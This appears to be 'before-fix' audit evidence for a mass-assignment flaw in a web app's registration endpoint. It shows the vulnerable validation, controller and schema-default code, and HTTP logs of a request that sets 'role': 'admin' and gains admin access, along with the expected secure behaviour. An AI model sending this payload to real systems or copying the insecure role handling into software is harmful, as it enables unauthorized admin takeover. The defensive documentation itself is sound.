# BEFORE-FIX EVIDENCE: V01 — Registration Mass Assignment

**Vulnerability:** Mass Assignment leading to Privilege Escalation (Admin Account Creation)  
**OWASP Category:** A01:2021 – Broken Access Control  
**Affected Component:** `POST /api/users/register`  
**Preconditions:** None (publicly accessible registration endpoint)  

---

## Attack Description & Flow

1. An unauthenticated attacker submits a registration request to `POST /api/users/register`.
2. The attacker includes `"role": "admin"` inside the JSON payload.
3. The Express validation middleware (`validateRegister` in `backend/middleware/validation.js`) explicitly permits `"role"` to be `"admin"`:
   ```javascript
   body('role').optional().isIn(['user', 'admin']).withMessage('Role must be either user or admin')
   ```
4. The controller (`register` in `backend/src/controllers/userController.js`) extracts `role` from `req.body` and assigns it to the new user:
   ```javascript
   const { email, password, role } = req.body;
   const user = await User.create({ email, password, role: role || 'user' });
   ```
5. In addition, `backend/src/models/User.js` defaults all users to `'admin'`:
   ```javascript
   role: { type: String, enum: ['user', 'admin'], default: 'admin' }
   ```
6. The created user is immediately granted the `admin` role and can access all admin-protected API routes.

---

## Runtime Verification Logs

### 1. Registration Request with Role Injection

```http
POST /api/users/register HTTP/1.1
Host: 127.0.0.1:5001
Content-Type: application/json

{
  "email": "test_admin@test.com",
  "password": "TestPassword123!",
  "role": "admin"
}
```

### 2. Backend Response (Status 201 Created)

```http
HTTP/1.1 201 Created
X-Powered-By: Express
Content-Type: application/json; charset=utf-8

{
  "success": true,
  "message": "User registered successfully. Please check your email to verify your account.",
  "data": {
    "user": {
      "id": "6ab6e7795e89b106943f7a94",
      "email": "test_admin@test.com",
      "role": "admin",
      "isEmailVerified": false
    }
  }
}
```

### 3. Database State Confirmation

Direct query against MongoDB confirms the user was persisted with `role: "admin"`:

```json
{
  "_id": "6ab6e7795e89b106943f7a94",
  "email": "test_admin@test.com",
  "role": "admin",
  "isEmailVerified": false,
  "createdAt": "2026-09-25T21:28:25.028Z"
}
```

### 4. Admin Privileges Verification

After account verification, authenticating via `POST /api/users/login` returns an admin JWT token:

```json
{
  "success": true,
  "message": "Login successful",
  "data": {
    "user": {
      "id": "6ab6e7795e89b106943f7a94",
      "email": "test_admin@test.com",
      "role": "admin"
    },
    "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
  }
}
```

Sending this token to the admin-only endpoint `GET /api/admin/stats`:

```http
GET /api/admin/stats HTTP/1.1
Host: 127.0.0.1:5001
Authorization: Bearer <TOKEN>

HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8

{
  "success": true,
  "data": {
    "totalUsers": 1,
    "totalStations": 0,
    "totalReviews": 0
  }
}
```

---

## Observed Result vs Expected Secure Result

* **Observed Result:** Unauthenticated registration payload successfully set `role: "admin"`, and the resulting account successfully accessed privileged admin-only routes.
* **Expected Secure Result:** Public registration must never accept or bind client-supplied `role` attributes; all standard accounts must be strictly assigned `role: "user"`; Mongoose schema default must be `'user'`.

**Impact:** Complete administrative compromise of the platform by any public registrant.  
**Source Location:** `backend/middleware/validation.js:9`, `backend/src/controllers/userController.js:51-64`, `backend/src/models/User.js:32`.  
**Runtime Verification:** **CONFIRMED RUNTIME**  
**Evidence Files:** `security/V01-mass-assignment/before/evidence.md`
